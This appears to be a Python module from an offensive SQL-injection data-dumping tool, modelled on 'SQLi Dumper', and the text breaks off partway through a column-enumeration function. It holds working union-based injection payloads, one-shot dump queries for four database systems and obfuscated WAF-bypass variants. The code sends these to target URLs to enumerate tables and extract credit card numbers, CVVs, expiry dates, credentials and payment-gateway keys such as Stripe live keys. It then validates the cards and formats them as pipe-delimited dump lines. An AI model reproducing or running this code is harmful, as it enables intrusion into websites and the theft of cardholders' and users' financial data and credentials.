"""
SQL Injection Data Dumper — DIOS + Targeted extraction

Extracts data from vulnerable databases using:
1. DIOS (Dump In One Shot) — single-query full schema/data extraction
2. Targeted mode — whitelist-based extraction focusing on card/payment data
3. Table/column enumeration
4. Iterative data extraction for union-based injections

Primary focus: Card data, payment info, credentials, gateway keys
"""

import re
import asyncio
import aiohttp
import csv
import json
import os
import random
from datetime import datetime
from typing import Dict, List, Optional, Tuple, Set
from dataclasses import dataclass, field
from urllib.parse import urlencode
from loguru import logger

from sqli_scanner import SQLiResult, SQLiScanner


@dataclass
class DumpedData:
    """Container for dumped database data."""
    url: str
    dbms: str
    database: str = ""
    tables: Dict[str, List[str]] = field(default_factory=dict)  # table: [columns]
    data: Dict[str, List[Dict]] = field(default_factory=dict)  # table: [{col: val}]
    card_data: List[Dict] = field(default_factory=list)
    credentials: List[Dict] = field(default_factory=list)
    gateway_keys: List[Dict] = field(default_factory=list)
    raw_dumps: List[str] = field(default_factory=list)
    timestamp: str = field(default_factory=lambda: datetime.now().isoformat())
    
    @property 
    def total_rows(self) -> int:
        return sum(len(rows) for rows in self.data.values())
    
    @property
    def has_valuable_data(self) -> bool:
        return bool(self.card_data or self.credentials or self.gateway_keys)


class SQLiDumper:
    """Extracts data from SQL injection vulnerable targets."""
    
    # High-value table names (whitelist for targeted mode)
    TARGET_TABLES = {
        "cards": [
            "cards", "credit_cards", "creditcards", "cc", "card_info",
            "payment_cards", "billing_cards", "card_details", "carddata",
            "stored_cards", "customer_cards", "user_cards", "payment_methods",
        ],
        "payments": [
            "payments", "payment", "transactions", "transaction", "orders",
            "order", "billing", "invoices", "invoice", "purchases",
            "checkout", "sales", "cart", "shopping_cart",
        ],
        "users": [
            "users", "user", "members", "member", "accounts", "account",
            "customers", "customer", "clients", "client", "admins", "admin",
            "administrators", "login", "logins", "auth", "wp_users",
            "user_accounts", "site_users", "tbl_users", "t_users",
        ],
        "config": [
            "config", "configuration", "settings", "options", "wp_options",
            "site_settings", "app_settings", "env", "environment",
            "api_keys", "secrets", "credentials", "keys",
        ],
    }
    
    # High-value column names (whitelist for targeted extraction)
    TARGET_COLUMNS = {
        "card_data": [
            "card_number", "cardnumber", "card_num", "cardnum", "cc_number",
            "ccnumber", "cc_num", "ccnum", "pan", "pan_number", "credit_card",
            "creditcard", "card_no", "cardno", "account_number", "acct_number",
            "debit_card", "card",
        ],
        "card_security": [
            "cvv", "cvc", "cvv2", "cvc2", "security_code", "securitycode",
            "card_code", "cardcode", "cv2", "ccv", "verification",
        ],
        "card_expiry": [
            "expiry", "expiry_date", "exp_date", "expdate", "exp_month",
            "exp_year", "expmonth", "expyear", "expiration", "expires",
            "card_expiry", "valid_thru", "valid_until", "mm_yy", "mmyy",
        ],
        "card_holder": [
            "cardholder", "card_holder", "cardholder_name", "name_on_card",
            "card_name", "billing_name", "holder_name",
        ],
        "credentials": [
            "password", "passwd", "pwd", "pass", "password_hash", "hash",
            "hashed_password", "user_pass", "user_password", "login_password",
            "secret", "pin", "passcode", "auth_token",
        ],
        "emails": [
            "email", "email_address", "mail", "user_email", "e_mail",
            "emailaddress", "contact_email",
        ],
        "usernames": [
            "username", "user_name", "login", "user_login", "uname",
            "user_id", "userid", "uid", "nickname", "display_name",
        ],
        "gateway_keys": [
            "stripe_key", "stripe_secret", "pk_live", "sk_live",
            "publishable_key", "secret_key", "api_key", "apikey",
            "api_secret", "apisecret", "merchant_id", "merchant_key",
            "private_key", "public_key", "access_token", "auth_key",
            "braintree_key", "paypal_key", "paypal_secret",
            "client_id", "client_secret", "consumer_key", "consumer_secret",
            "webhook_secret", "signing_secret",
        ],
        "billing": [
            "billing_address", "billing_city", "billing_state",
            "billing_zip", "billing_country", "billing_phone",
            "address", "city", "state", "zip", "zipcode", "postal_code",
            "country", "phone", "ssn", "social_security",
            "tax_id", "ein", "dob", "date_of_birth", "birth_date",
        ],
    }
    
    # DIOS (Dump In One Shot) queries per DBMS
    DIOS_QUERIES = {
        "mysql": (
            "(SELECT (@a) FROM (SELECT (@a:=0x00), "
            "(SELECT (@a) FROM information_schema.columns "
            "WHERE table_schema=database() AND "
            "@a:=CONCAT(@a,0x3c62723e,table_name,0x3a3a,column_name)))a)"
        ),
        "mysql_data": (
            "(SELECT (@a) FROM (SELECT (@a:=0x00), "
            "(SELECT (@a) FROM {table} "
            "WHERE @a:=CONCAT(@a,0x3c62723e,{columns}) LIMIT {limit}))a)"
        ),
        "mssql": (
            "STUFF((SELECT CHAR(60)+CHAR(98)+CHAR(114)+CHAR(62)+"
            "table_name+CHAR(58)+CHAR(58)+column_name "
            "FROM information_schema.columns "
            "WHERE table_catalog=DB_NAME() FOR XML PATH('')),1,0,'')"
        ),
        "postgresql": (
            "array_to_string(ARRAY(SELECT table_name||'::'||column_name "
            "FROM information_schema.columns "
            "WHERE table_catalog=current_database()),chr(10))"
        ),
        "oracle": (
            "LISTAGG(table_name||'::'||column_name,CHR(10)) WITHIN GROUP (ORDER BY table_name) "
            "FROM all_tab_columns WHERE owner=(SELECT user FROM dual)"
        ),
    }
    
    # WAF Bypass DIOS queries (from SQLi Dumper v8.5 with obfuscation)
    WAF_BYPASS_DIOS = {
        "mysql": [
            # Mixed case + inline comments
            (
                "(sElEcT/**/(@a)/**/fRoM/**/(sElEcT/**/(@a:=0x00),"
                "(sElEcT/**/(@a)/**/fRoM/**/iNfOrMaTiOn_sChEmA.cOlUmNs/**/"
                "wHeRe/**/tAbLe_sChEmA=dAtAbAsE()/**/aNd/**/"
                "@a:=cOnCaT(@a,0x3c62723e,tAbLe_nAmE,0x3a3a,cOlUmN_nAmE)))a)"
            ),
            # URL encoded comments
            (
                "(sElEcT%2f**%2f(@a)%2f**%2ffRoM%2f**%2f(sElEcT%2f**%2f(@a:=0x00),"
                "(sElEcT%2f**%2f(@a)%2f**%2ffRoM%2f**%2fiNfOrMaTiOn_sChEmA.cOlUmNs%2f**%2f"
                "wHeRe%2f**%2ftAbLe_sChEmA=dAtAbAsE()%2f**%2faNd%2f**%2f"
                "@a:=cOnCaT(@a,0x3c62723e,tAbLe_nAmE,0x3a3a,cOlUmN_nAmE)))a)"
            ),
            # Double encoding bypass
            (
                "/*!50000(sElEcT*/(@a)/*!50000fRoM*/(/*!50000sElEcT*/(@a:=0x00),"
                "(/*!50000sElEcT*/(@a)/*!50000fRoM*//*!50000iNfOrMaTiOn_sChEmA*/.cOlUmNs/**/"
                "/*!50000wHeRe*/tAbLe_sChEmA=dAtAbAsE()/*!50000aNd*/"
                "@a:=/*!50000cOnCaT*/(@a,0x3c62723e,tAbLe_nAmE,0x3a3a,cOlUmN_nAmE)))a)"
            ),
        ],
        "mssql": [
            # Mixed case MSSQL
            (
                "sTuFf((sElEcT/**/cHaR(60)+cHaR(98)+cHaR(114)+cHaR(62)+"
                "tAbLe_nAmE+cHaR(58)+cHaR(58)+cOlUmN_nAmE/**/"
                "fRoM/**/iNfOrMaTiOn_sChEmA.cOlUmNs/**/"
                "wHeRe/**/tAbLe_cAtAlOg=dB_nAmE()/**/fOr/**/xMl/**/pAtH('')),1,0,'')"
            ),
            # Using SYSOBJECTS/SYSCOLUMNS (SQLi Dumper style)
            (
                "sTuFf((sElEcT/**/cHaR(60)+cHaR(98)+cHaR(114)+cHaR(62)+"
                "o.nAmE+cHaR(58)+cHaR(58)+c.nAmE/**/"
                "fRoM/**/sYsObJeCtS/**/o/**/jOiN/**/sYsCoLuMnS/**/c/**/"
                "oN/**/o.iD=c.iD/**/wHeRe/**/o.xTyPe='U'/**/fOr/**/xMl/**/pAtH('')),1,0,'')"
            ),
        ],
        "postgresql": [
            # Mixed case PostgreSQL
            (
                "aRrAy_tO_sTrInG(aRrAy(sElEcT/**/tAbLe_nAmE||'::'||cOlUmN_nAmE/**/"
                "fRoM/**/iNfOrMaTiOn_sChEmA.cOlUmNs/**/"
                "wHeRe/**/tAbLe_cAtAlOg=cUrReNt_dAtAbAsE()),cHr(10))"
            ),
        ],
        "oracle": [
            # Mixed case Oracle
            (
                "lIsTaGg(tAbLe_nAmE||'::'||cOlUmN_nAmE,cHr(10))/**/wItHiN/**/gRoUp/**/"
                "(oRdEr/**/bY/**/tAbLe_nAmE)/**/fRoM/**/aLl_tAb_cOlUmNs/**/"
                "wHeRe/**/oWnEr=(sElEcT/**/uSeR/**/fRoM/**/dUaL)"
            ),
        ],
    }
    
    # Multi-DBMS schema enumeration queries
    SCHEMA_QUERIES = {
        "mysql": {
            "databases": "sElEcT/**/sChEmA_nAmE/**/fRoM/**/iNfOrMaTiOn_sChEmA.sChEmAtA",
            "tables": "sElEcT/**/tAbLe_nAmE/**/fRoM/**/iNfOrMaTiOn_sChEmA.tAbLeS/**/wHeRe/**/tAbLe_sChEmA={db}",
            "columns": "sElEcT/**/cOlUmN_nAmE/**/fRoM/**/iNfOrMaTiOn_sChEmA.cOlUmNs/**/wHeRe/**/tAbLe_nAmE='{table}'/**/aNd/**/tAbLe_sChEmA={db}",
            "current_db": "dAtAbAsE()",
            "version": "vErSiOn()",
            "user": "uSeR()",
        },
        "mssql": {
            "databases": "sElEcT/**/nAmE/**/fRoM/**/mAsTeR..sYsDaTaBaSeS",
            "tables": "sElEcT/**/nAmE/**/fRoM/**/sYsObJeCtS/**/wHeRe/**/xTyPe='U'",
            "columns": "sElEcT/**/c.nAmE/**/fRoM/**/sYsCoLuMnS/**/c/**/jOiN/**/sYsObJeCtS/**/o/**/oN/**/c.iD=o.iD/**/wHeRe/**/o.nAmE='{table}'",
            "current_db": "dB_nAmE()",
            "version": "@@vErSiOn",
            "user": "sYsTeM_uSeR",
        },
        "postgresql": {
            "databases": "sElEcT/**/dAtNaMe/**/fRoM/**/pG_dAtAbAsE",
            "tables": "sElEcT/**/tAbLeNaMe/**/fRoM/**/pG_tAbLeS/**/wHeRe/**/sChEmAnAmE='pUbLiC'",
            "columns": "sElEcT/**/cOlUmN_nAmE/**/fRoM/**/iNfOrMaTiOn_sChEmA.cOlUmNs/**/wHeRe/**/tAbLe_nAmE='{table}'",
            "current_db": "cUrReNt_dAtAbAsE()",
            "version": "vErSiOn()",
            "user": "cUrReNt_uSeR",
        },
        "oracle": {
            "databases": "sElEcT/**/uSeRnAmE/**/fRoM/**/aLl_uSeRs",
            "tables": "sElEcT/**/tAbLe_nAmE/**/fRoM/**/aLl_tAbLeS/**/wHeRe/**/oWnEr=uPpEr('{db}')",
            "columns": "sElEcT/**/cOlUmN_nAmE/**/fRoM/**/aLl_tAb_cOlUmNs/**/wHeRe/**/tAbLe_nAmE=uPpEr('{table}')",
            "current_db": "(sElEcT/**/sYs_cOnTeXt('uSeReNv','dB_nAmE')/**/fRoM/**/dUaL)",
            "version": "(sElEcT/**/bAnNeR/**/fRoM/**/v$vErSiOn/**/wHeRe/**/rOwNuM=1)",
            "user": "(sElEcT/**/uSeR/**/fRoM/**/dUaL)",
        },
    }

    def __init__(self, scanner: SQLiScanner = None, output_dir: str = None,
                 max_rows: int = 500, timeout: int = 20):
        self.scanner = scanner or SQLiScanner(timeout=timeout)
        self.output_dir = output_dir or os.path.join(os.path.dirname(__file__), "dumps")
        self.max_rows = max_rows
        self.timeout = timeout
        
        os.makedirs(self.output_dir, exist_ok=True)
    
    # ==================== CARD DETECTION ====================
    
    @staticmethod
    def luhn_check(card_number: str) -> bool:
        """Validate card number using Luhn algorithm (SQLi Dumper style).
        
        The Luhn algorithm validates credit card numbers by:
        1. Starting from rightmost digit, double every second digit
        2. If doubling results in >9, subtract 9
        3. Sum all digits - valid if divisible by 10
        """
        try:
            # Clean the number
            num = card_number.replace(" ", "").replace("-", "").replace(".", "")
            if not num.isdigit() or len(num) < 13 or len(num) > 19:
                return False
            
            # Luhn algorithm
            digits = [int(d) for d in num]
            odd_digits = digits[-1::-2]
            even_digits = digits[-2::-2]
            
            checksum = sum(odd_digits)
            for d in even_digits:
                checksum += sum(divmod(d * 2, 10))
            
            return checksum % 10 == 0
        except:
            return False
    
    @staticmethod
    def detect_card_type(card_number: str) -> str:
        """Detect card type from BIN (first 6 digits).
        
        Based on SQLi Dumper's card type detection logic.
        """
        num = card_number.replace(" ", "").replace("-", "")
        if not num.isdigit() or len(num) < 13:
            return "Unknown"
        
        # Major card types by BIN ranges
        if num.startswith("4"):
            return "Visa"
        elif num.startswith(("51", "52", "53", "54", "55")):
            return "Mastercard"
        elif num.startswith(("2221", "2222", "2223", "2224", "2225", "2226", "2227", "2228", "2229",
                            "223", "224", "225", "226", "227", "228", "229", "23", "24", "25", "26",
                            "270", "271", "2720")):
            return "Mastercard"  # New MC ranges
        elif num.startswith(("34", "37")):
            return "American Express"
        elif num.startswith("6011") or num.startswith(("644", "645", "646", "647", "648", "649", "65")):
            return "Discover"
        elif num.startswith(("300", "301", "302", "303", "304", "305", "36", "38")):
            return "Diners Club"
        elif num.startswith(("3528", "3529")) or (num[:4].isdigit() and 3530 <= int(num[:4]) <= 3589):
            return "JCB"
        elif num.startswith("62"):
            return "UnionPay"
        elif num.startswith(("4903", "4905", "4911", "4936", "564182", "633110", "6333", "6759")):
            return "Maestro"
        else:
            return "Unknown"
    
    @staticmethod
    def format_card_for_dump(card_data: Dict) -> str:
        """Format card data for dump output (SQLi Dumper style).
        
        Format: PAN|MM/YY|CVV|Holder|Address|City|State|Zip|Country
        """
        pan = card_data.get("card_number", card_data.get("pan", card_data.get("cc_number", "")))
        exp = card_data.get("expiry", card_data.get("exp_date", ""))
        cvv = card_data.get("cvv", card_data.get("cvc", card_data.get("security_code", "")))
        holder = card_data.get("cardholder", card_data.get("card_holder", card_data.get("name_on_card", "")))
        address = card_data.get("address", card_data.get("billing_address", ""))
        city = card_data.get("city", card_data.get("billing_city", ""))
        state = card_data.get("state", card_data.get("billing_state", ""))
        zip_code = card_data.get("zip", card_data.get("postal_code", card_data.get("billing_zip", "")))
        country = card_data.get("country", card_data.get("billing_country", ""))
        
        return f"{pan}|{exp}|{cvv}|{holder}|{address}|{city}|{state}|{zip_code}|{country}"
    
    def validate_and_enrich_card(self, card_data: Dict) -> Optional[Dict]:
        """Validate card data and enrich with card type.
        
        Returns enriched dict if valid, None if invalid.
        """
        # Find the card number field
        pan = None
        for key in ("card_number", "pan", "cc_number", "cardnumber", "cc", "card_num", "ccnum"):
            if key in card_data:
                pan = str(card_data[key]).replace(" ", "").replace("-", "")
                break
        
        # Also check all values for card number pattern
        if not pan:
            for val in card_data.values():
                val_str = str(val).replace(" ", "").replace("-", "")
                if val_str.isdigit() and 13 <= len(val_str) <= 19 and val_str[0] in "3456":
                    if self.luhn_check(val_str):
                        pan = val_str
                        break
        
        if not pan or not self.luhn_check(pan):
            return None
        
        # Enrich with card type
        enriched = card_data.copy()
        enriched["card_type"] = self.detect_card_type(pan)
        enriched["pan_masked"] = f"{pan[:6]}******{pan[-4:]}"
        enriched["bin"] = pan[:6]
        enriched["is_valid"] = True
        
        return enriched

    # ==================== CARD-SPECIFIC EXTRACTION ====================
    
    # Card-focused extraction queries (SQLi Dumper style)
    CARD_EXTRACTION_QUERIES = {
        "mysql": {
            # Direct card table dump (CONCAT with markers)
            "card_dump": (
                "cOnCaT_wS(0x7c,{card_col},{exp_col},{cvv_col},{holder_col})"
            ),
            # Find card tables
            "find_card_tables": (
                "sElEcT/**/tAbLe_nAmE/**/fRoM/**/iNfOrMaTiOn_sChEmA.cOlUmNs/**/"
                "wHeRe/**/cOlUmN_nAmE/**/lIkE/**/'%card%'/**/oR/**/"
                "cOlUmN_nAmE/**/lIkE/**/'%credit%'/**/oR/**/"
                "cOlUmN_nAmE/**/lIkE/**/'%pan%'/**/oR/**/"
                "cOlUmN_nAmE/**/lIkE/**/'%ccnum%'/**/"
                "gRoUp/**/bY/**/tAbLe_nAmE"
            ),
            # Find card columns in a table
            "find_card_columns": (
                "sElEcT/**/cOlUmN_nAmE/**/fRoM/**/iNfOrMaTiOn_sChEmA.cOlUmNs/**/"
                "wHeRe/**/tAbLe_nAmE='{table}'/**/aNd/**/tAbLe_sChEmA=dAtAbAsE()/**/"
                "aNd/**/(cOlUmN_nAmE/**/lIkE/**/'%card%'/**/oR/**/"
                "cOlUmN_nAmE/**/lIkE/**/'%pan%'/**/oR/**/"
                "cOlUmN_nAmE/**/lIkE/**/'%cvv%'/**/oR/**/"
                "cOlUmN_nAmE/**/lIkE/**/'%exp%'/**/oR/**/"
                "cOlUmN_nAmE/**/lIkE/**/'%holder%')"
            ),
        },
        "mssql": {
            "find_card_tables": (
                "sElEcT/**/tAbLe_nAmE/**/fRoM/**/iNfOrMaTiOn_sChEmA.cOlUmNs/**/"
                "wHeRe/**/cOlUmN_nAmE/**/lIkE/**/'%card%'/**/oR/**/"
                "cOlUmN_nAmE/**/lIkE/**/'%credit%'/**/"
                "gRoUp/**/bY/**/tAbLe_nAmE"
            ),
        },
    }
    
    # Dump markers (SQLi Dumper style)
    DUMP_MARKERS = {
        "field_sep": "!~!",      # Field separator
        "row_sep": "3!P",         # Row separator  
        "start_marker": "<<<DUMP>>>",
        "end_marker": "<<<END>>>",
    }

    def _is_target_table(self, table_name: str) -> bool:
        """Check if table name matches any high-value target."""
        table_lower = table_name.lower()
        for category, names in self.TARGET_TABLES.items():
            for name in names:
                if name in table_lower or table_lower in name:
                    return True
        return False
    
    def _is_target_column(self, column_name: str) -> Optional[str]:
        """Check if column name matches any high-value target. Returns category."""
        col_lower = column_name.lower()
        for category, names in self.TARGET_COLUMNS.items():
            for name in names:
                if name == col_lower or name in col_lower:
                    return category
        return None
    
    def _categorize_row(self, row: Dict[str, str]) -> Dict[str, List[Dict]]:
        """Categorize a data row into card_data, credentials, gateway_keys.
        
        Uses Luhn validation for card numbers.
        """
        categorized = {"card_data": [], "credentials": [], "gateway_keys": []}
        
        card_entry = {}
        cred_entry = {}
        key_entry = {}
        
        for col, val in row.items():
            if not val or str(val).lower() in ("null", "none", ""):
                continue
            
            category = self._is_target_column(col)
            if category in ("card_data", "card_security", "card_expiry", "card_holder"):
                card_entry[col] = val
            elif category in ("credentials", "emails", "usernames"):
                cred_entry[col] = val
            elif category == "gateway_keys":
                key_entry[col] = val
            elif category == "billing":
                card_entry[col] = val  # Billing goes with card data
        
        # Also check values for patterns regardless of column names
        for col, val in row.items():
            if not val:
                continue
            val_str = str(val)
            
            # Stripe keys
            if re.match(r'pk_live_[A-Za-z0-9]{20,}', val_str):
                key_entry[col] = val_str
            elif re.match(r'sk_live_[A-Za-z0-9]{20,}', val_str):
                key_entry[col] = val_str
            elif re.match(r'rk_live_[A-Za-z0-9]{20,}', val_str):
                key_entry[col] = val_str
            # AWS keys
            elif re.match(r'AKIA[0-9A-Z]{16}', val_str):
                key_entry[col] = val_str
            
            # Card numbers - MUST pass Luhn check
            clean_val = val_str.replace(" ", "").replace("-", "").replace(".", "")
            if clean_val.isdigit() and 13 <= len(clean_val) <= 19 and clean_val[0] in "3456":
                if self.luhn_check(clean_val):
                    card_entry[col] = val_str
                    card_entry["_detected_pan"] = clean_val
                    card_entry["_card_type"] = self.detect_card_type(clean_val)
                    logger.info(f"💳 Valid card detected: {clean_val[:6]}******{clean_val[-4:]} ({card_entry['_card_type']})")
            
            # CVV pattern (3-4 digits in CVV-like column)
            if len(val_str) in (3, 4) and val_str.isdigit():
                col_lower = col.lower()
                if any(cvv in col_lower for cvv in ("cvv", "cvc", "cv2", "security", "code")):
                    card_entry[col] = val_str
            
            # Expiry pattern (MM/YY or MMYY or MM-YY)
            exp_match = re.match(r'^(0[1-9]|1[0-2])[/\-]?(\d{2}|\d{4})$', val_str)
            if exp_match:
                col_lower = col.lower()
                if any(exp in col_lower for exp in ("exp", "valid", "date", "month", "year")):
                    card_entry[col] = val_str
        
        if card_entry:
            # Validate and enrich card data
            enriched = self.validate_and_enrich_card(card_entry)
            if enriched:
                categorized["card_data"].append(enriched)
            else:
                # Still save if has other card-related info even without valid PAN
                categorized["card_data"].append(card_entry)
        
        if cred_entry:
            categorized["credentials"].append(cred_entry)
        if key_entry:
            categorized["gateway_keys"].append(key_entry)
        
        return categorized
    
    async def hunt_card_tables(self, sqli: SQLiResult, 
                                session: aiohttp.ClientSession) -> List[str]:
        """Specifically hunt for tables containing card data.
        
        Uses SQLi Dumper's card-hunting queries to find tables with
        card-related columns.
        
        Returns:
            List of table names likely containing card data
        """
        card_tables = []
        scanner = self.scanner
        base, params = scanner._parse_url(sqli.url)
        original = params[sqli.parameter][0] if isinstance(params[sqli.parameter], list) else params[sqli.parameter]
        
        if sqli.injection_type != "union" or not sqli.injectable_columns:
            return card_tables
        
        col_idx = sqli.injectable_columns[0]
        null_list = ["nUlL"] * sqli.column_count
        
        marker_start = f"{random.randint(100000, 999999)}"
        marker_end = f"{random.randint(100000, 999999)}"
        
        # Query for tables with card-like columns
        null_list_copy = null_list.copy()
        null_list_copy[col_idx] = f"cOnCaT(0x{marker_start},gRoUp_cOnCaT(DiStInCt/**/tAbLe_nAmE),0x{marker_end})"
        
        query = (
            f"'/**/uNiOn/**/aLl/**/sElEcT/**/{','.join(null_list_copy)}/**/"
            f"fRoM/**/iNfOrMaTiOn_sChEmA.cOlUmNs/**/"
            f"wHeRe/**/(cOlUmN_nAmE/**/lIkE/**/'%card%'/**/oR/**/"
            f"cOlUmN_nAmE/**/lIkE/**/'%credit%'/**/oR/**/"
            f"cOlUmN_nAmE/**/lIkE/**/'%pan%'/**/oR/**/"
            f"cOlUmN_nAmE/**/lIkE/**/'%ccnum%'/**/oR/**/"
            f"cOlUmN_nAmE/**/lIkE/**/'%cvv%')/**/aNd/**/"
            f"tAbLe_sChEmA=dAtAbAsE()-- -"
        )
        
        test_params = params.copy()
        test_params[sqli.parameter] = [f"{original}{query}"]
        test_url = scanner._build_url(base, test_params)
        
        body, _ = await scanner._fetch(test_url, session)
        if body:
            match = re.search(rf'{marker_start}(.+?){marker_end}', body)
            if match:
                tables = [t.strip() for t in match.group(1).split(",") if t.strip()]
                card_tables.extend(tables)
                logger.info(f"💳 Found {len(tables)} potential card tables: {tables}")
        
        # Also check standard payment/transaction table names
        all_tables = await self.enumerate_tables(sqli, session)
        payment_keywords = ["card", "credit", "payment", "billing", "transaction", "order", "checkout", "stripe", "paypal"]
        
        for table in all_tables:
            table_lower = table.lower()
            if any(kw in table_lower for kw in payment_keywords):
                if table not in card_tables:
                    card_tables.append(table)
        
        return list(set(card_tables))
    
    async def extract_cards(self, sqli: SQLiResult, 
                            session: aiohttp.ClientSession,
                            max_cards: int = 100) -> List[Dict]:
        """Extract credit card data from vulnerable database.
        
        Priority pipeline:
        1. Hunt for card-specific tables
        2. Find card-related columns in those tables
        3. Extract and validate card data with Luhn check
        4. Enrich with card type detection
        
        Args:
            sqli: SQLi vulnerability result
            session: aiohttp session
            max_cards: Maximum cards to extract
            
        Returns:
            List of validated card data dicts
        """
        cards = []
        
        # Hunt for card tables
        card_tables = await self.hunt_card_tables(sqli, session)
        if not card_tables:
            logger.info("No card tables found, checking all tables...")
            card_tables = await self.enumerate_tables(sqli, session)
        
        for table in card_tables[:10]:  # Limit to 10 tables
            try:
                # Get columns for this table
                columns = await self.enumerate_columns(sqli, table, session)
                if not columns:
                    continue
                
                # Prioritize card-related columns
                card_cols = []
                other_cols = []
                for col in columns:
                    col_lower = col.lower()
                    if any(kw in col_lower for kw in ["card", "pan", "cc", "credit", "cvv", "cvc", "exp", "holder", "name"]):
                        card_cols.append(col)
                    else:
                        other_cols.append(col)
                
                # Extract with card columns first
                extract_cols = card_cols + other_cols[:10]  # Up to 10 other columns
                if not extract_cols:
                    continue
                
                rows = await self.extract_data(sqli, table, extract_cols, session)
                
                for row in rows:
                    # Categorize and check for valid cards
                    categorized = self._categorize_row(row)
                    for card in categorized["card_data"]:
                        if card.get("is_valid") or card.get("_detected_pan"):
                            cards.append(card)
                            if len(cards) >= max_cards:
                                break
                    
                    if len(cards) >= max_cards:
                        break
                
                if len(cards) >= max_cards:
                    break
                    
            except Exception as e:
                logger.debug(f"Card extraction error for table {table}: {e}")
                continue
        
        # Deduplicate by PAN
        seen_pans = set()
        unique_cards = []
        for card in cards:
            pan = card.get("_detected_pan", card.get("card_number", ""))
            if pan and pan not in seen_pans:
                seen_pans.add(pan)
                unique_cards.append(card)
        
        logger.info(f"💳 Extracted {len(unique_cards)} unique valid cards")
        return unique_cards

    async def enumerate_tables(self, sqli: SQLiResult, 
                               session: aiohttp.ClientSession) -> List[str]:
        """Enumerate database tables through SQL injection.
        
        Args:
            sqli: SQLi vulnerability result
            session: aiohttp session
            
        Returns:
            List of table names
        """
        tables = []
        scanner = self.scanner
        base_url = sqli.url
        param = sqli.parameter
        
        base, params = scanner._parse_url(base_url)
        original = params[param][0] if isinstance(params[param], list) else params[param]
        
        if sqli.injection_type == "union" and sqli.injectable_columns:
            col_idx = sqli.injectable_columns[0]
            null_list = ["NULL"] * sqli.column_count
            
            if sqli.dbms in ("mysql", ""):
                # MySQL: Extract from information_schema
                marker_start = f"{random.randint(100000, 999999)}"
                marker_end = f"{random.randint(100000, 999999)}"
                
                for offset in range(0, 200, 20):
                    null_list_copy = null_list.copy()
                    null_list_copy[col_idx] = (
                        f"CONCAT(0x{marker_start},"
                        f"GROUP_CONCAT(table_name SEPARATOR 0x2c),"
                        f"0x{marker_end})"
                    )
                    
                    query = (
                        f"' UNION ALL SELECT {','.join(null_list_copy)} "
                        f"FROM information_schema.tables "
                        f"WHERE table_schema=database() "
                        f"LIMIT {offset},20-- -"
                    )
                    
                    test_params = params.copy()
                    test_params[param] = [f"{original}{query}"]
                    test_url = scanner._build_url(base, test_params)
                    
                    body, _ = await scanner._fetch(test_url, session)
                    if body:
                        match = re.search(rf'{marker_start}(.+?){marker_end}', body)
                        if match:
                            found = match.group(1).split(",")
                            tables.extend(found)
                            if len(found) < 20:
                                break
                        else:
                            break
            
            elif sqli.dbms == "mssql":
                null_list_copy = null_list.copy()
                null_list_copy[col_idx] = "name"
                query = (
                    f"' UNION ALL SELECT {','.join(null_list_copy)} "
                    f"FROM sysobjects WHERE xtype='U'-- -"
                )
                test_params = params.copy()
                test_params[param] = [f"{original}{query}"]
                test_url = scanner._build_url(base, test_params)
                
                body, _ = await scanner._fetch(test_url, session)
                if body:
                    # Try to parse table names from response
                    for t in re.findall(r'>\s*(\w+)\s*<', body):
                        if len(t) > 2 and t.lower() not in ("null", "tr", "td", "br", "div"):
                            tables.append(t)
            
            elif sqli.dbms == "postgresql":
                null_list_copy = null_list.copy()
                null_list_copy[col_idx] = "tablename"
                query = (
                    f"' UNION ALL SELECT {','.join(null_list_copy)} "
                    f"FROM pg_tables WHERE schemaname='public'-- -"
                )
                test_params = params.copy()
                test_params[param] = [f"{original}{query}"]
                test_url = scanner._build_url(base, test_params)
                
                body, _ = await scanner._fetch(test_url, session)
                if body:
                    for t in re.findall(r'>\s*(\w+)\s*<', body):
                        if len(t) > 2 and t.lower() not in ("null", "tr", "td", "br", "div"):
                            tables.append(t)
        
        # Try WAF bypass schema queries if standard failed
        if not tables:
            logger.info("Standard table enumeration failed, trying WAF bypass...")
            tables = await self.extract_with_schema_queries(sqli, session)
        
        # Deduplicate
        tables = list(dict.fromkeys(tables))
        logger.info(f"Enumerated {len(tables)} tables from {base_url}")
        return tables

    async def enumerate_columns(self, sqli: SQLiResult, table: str,
                                 session: aiohttp.ClientSession) -> List[str]:
        """Enumerate columns for a specific table.
        
        Args:
            sqli: SQLi vulnerability result
            table: Table name to enumerate columns for
            session: aiohttp session
            
        Returns:
            List of column names
        """
        columns = []
        scanner = self.scanner
        base, params = scanner._parse_url(sqli.url)
        original = params[sqli.parameter][0] if isinstance(params[sqli.parameter], list) else params[sqli.parameter]
        
        if sqli.injection_type == "union" and sqli.injectable_columns:
            col_idx = sqli.injectable_columns[0]
            null_list = ["NULL"] * sqli.column_count
            
            if sqli.dbms in ("mysql", ""):
                marker_start = f"{random.randint(100000, 999999)}"
                marker_end = f"{random.randint(100000, 999999)}"
                
                null_list_copy = null_list.copy()
                null_list_copy[col_idx] = (
                    f"CONCAT(0x{marker_start},"
                    f"GROUP_CONCAT(column_name SEPARATOR 0x2c),"
                    f"0x{marker_end})"
                )
                
                query = (
                    f"' UNION ALL SELECT {','.join(null_list_copy)} "
                    f"FROM information_schema.columns "
                    f"WHERE table_schema=database() AND table_name='{table}'-- -"
                )
                
                test_params = params.copy()
                test_params[sqli.parameter] = [f"{original}{query}"]
                test_url = scanner._build_url(base, test_params)
                
                body, _ = await scanner._fetch(test_url, session)
                if body:
                    match = re.search(rf'{marker_start}(.+?){marker_end}', body)
                    if match:
                        columns = match.group(1).split(",")
            
            elif sqli.dbms == "mssql":
                null_list_copy = null_list.copy()
                null_list_copy[col_idx] = "column_name"
                query = (
                    f"' UNION ALL SELECT {','.join(null_list_copy)} "
                    f"FROM information_schema.columns "
                    f"WHERE table_name='{table}'-- -"
                )
                test_params = params.copy()
                test_params[sqli.parameter] = [f"{original}{query}"]
                test_url = scanner._build_url(base, test_params)
                
                body, _ = await scanner._fetch(test_url, session)
                if body:
                    for c in re.findall(r'>\s*(\w+)\s*<', body):
                        if len(c) > 1 and c.lower() not in ("null", "tr", "td", "br", "div"):
                            columns.append(c)
            
            elif sqli.dbms == "postgresql":
                null_list_copy = null_list.copy()
                null_list_copy[col_idx] = "column_name"
                query = (
                    f"' UNION ALL SELECT {','.join(null_list_copy)} "
                    f"FROM information_schema.columns "
                    f"WHERE table_name='{table}'-- -"
                )
                test_params = params.copy()
                test_params[sqli.parameter] = [f"{original}{query}"]
                test_url = scanner._build_url(base, test_params)
                
                body, _ = await scanner._fetch(test_url, session)
                if body:
                    for c in re.findall(r'>\s*(\w+)\s*<', body):
                        if len(c) > 1 and c.lower() not in ("null", "tr", "td", "br", "div"):
                            columns.append(c)
        
        columns = list(dict.fromkeys(columns))
